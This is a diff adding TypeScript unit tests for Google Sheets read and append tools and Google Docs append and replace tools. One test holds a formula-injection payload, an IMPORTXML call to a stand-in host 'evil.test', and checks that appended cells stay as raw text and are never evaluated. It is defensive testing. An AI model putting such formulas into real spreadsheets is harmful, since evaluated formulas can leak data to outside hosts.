@@ -159,3 +159,113 @@ describe("drive-createFile", () => {
     expect(upload?.body).toContain("<h1>Heading</h1>")
   })
 })
+
+describe("Sheets read and append", () => {
+  it("reads a range, quoting the tab name", async () => {
+    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+      requests.push({ url: String(input), method: init?.method ?? "GET", body: "" })
+      return Response.json({ range: "Sheet1!A1:B2", values: [["item", "cost"], ["rent", "900"]] })
+    }) as typeof fetch
+
+    const res = (await executeTool("drive-readSheet", {
+      spreadsheetId: "sheet_1",
+      range: "A1:B2",
+      sheetName: "Q3 Budget",
+    })) as { rowCount: number; rows: string[][] }
+
+    expect(res.rowCount).toBe(2)
+    expect(res.rows[1]).toEqual(["rent", "900"])
+    // Tab names with spaces must be single-quoted in the A1 reference.
+    expect(decodeURIComponent(requests[0]!.url)).toContain("'Q3 Budget'!A1:B2")
+  })
+
+  it("appends rows without overwriting, using RAW and INSERT_ROWS", async () => {
+    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+      requests.push({
+        url: String(input),
+        method: init?.method ?? "GET",
+        body: typeof init?.body === "string" ? init.body : "",
+      })
+      return Response.json({ updates: { updatedRange: "Sheet1!A5:B5", updatedRows: 1 } })
+    }) as typeof fetch
+
+    const res = (await executeTool("drive-appendSheetRows", {
+      spreadsheetId: "sheet_1",
+      content: "coffee,4.50",
+    })) as { ok: boolean; appendedRows: number }
+
+    expect(res.ok).toBe(true)
+    expect(res.appendedRows).toBe(1)
+    const req = requests[0]!
+    expect(req.method).toBe("POST")
+    expect(req.url).toContain(":append")
+    expect(req.url).toContain("valueInputOption=RAW")
+    expect(req.url).toContain("insertDataOption=INSERT_ROWS")
+    // Numeric cell coerced; text left alone.
+    expect(JSON.parse(req.body)).toEqual({ values: [["coffee", 4.5]] })
+  })
+
+  it("never evaluates an appended formula (RAW, not USER_ENTERED)", async () => {
+    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+      requests.push({
+        url: String(input),
+        method: init?.method ?? "GET",
+        body: typeof init?.body === "string" ? init.body : "",
+      })
+      return Response.json({ updates: { updatedRows: 1 } })
+    }) as typeof fetch
+
+    await executeTool("drive-appendSheetRows", {
+      spreadsheetId: "sheet_1",
+      content: '"=IMPORTXML(""http://evil.test"",""//x"")",ok',
+    })
+    expect(requests[0]!.url).not.toContain("USER_ENTERED")
+    const { values } = JSON.parse(requests[0]!.body) as { values: (string | number)[][] }
+    expect(values[0]![0]).toBe('=IMPORTXML("http://evil.test","//x")')
+    expect(values[0]![1]).toBe("ok")
+  })
+})
+
+describe("Docs editing", () => {
+  it("appends at the end of the body, one before the final index", async () => {
+    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+      const url = String(input)
+      requests.push({
+        url,
+        method: init?.method ?? "GET",
+        body: typeof init?.body === "string" ? init.body : "",
+      })
+      if (url.includes("batchUpdate")) return Response.json({ replies: [] })
+      return Response.json({ body: { content: [{ endIndex: 1 }, { endIndex: 42 }] } })
+    }) as typeof fetch
+
+    const res = (await executeTool("drive-appendToDoc", {
+      documentId: "doc_1",
+      text: "\nMeeting notes",
+    })) as { ok: boolean }
+
+    expect(res.ok).toBe(true)
+    const batch = requests.find((r) => r.url.includes("batchUpdate"))!
+    const { requests: reqs } = JSON.parse(batch.body) as {
+      requests: { insertText: { location: { index: number }; text: string } }[]
+    }
+    // Docs rejects an insert at endIndex itself — it must land at endIndex - 1.
+    expect(reqs[0]!.insertText.location.index).toBe(41)
+    expect(reqs[0]!.insertText.text).toBe("\nMeeting notes")
+  })
+
+  it("reports zero occurrences when the find text is absent", async () => {
+    globalThis.fetch = (async () =>
+      Response.json({ replies: [{ replaceAllText: { occurrencesChanged: 0 } }] })) as typeof fetch
+
+    const res = (await executeTool("drive-replaceInDoc", {
+      documentId: "doc_1",
+      find: "TBD",
+      replaceWith: "Done",
+      matchCase: true,
+    })) as { occurrencesChanged: number; message: string }
+
+    expect(res.occurrencesChanged).toBe(0)
+    expect(res.message).toContain("not found")
+  })
+})
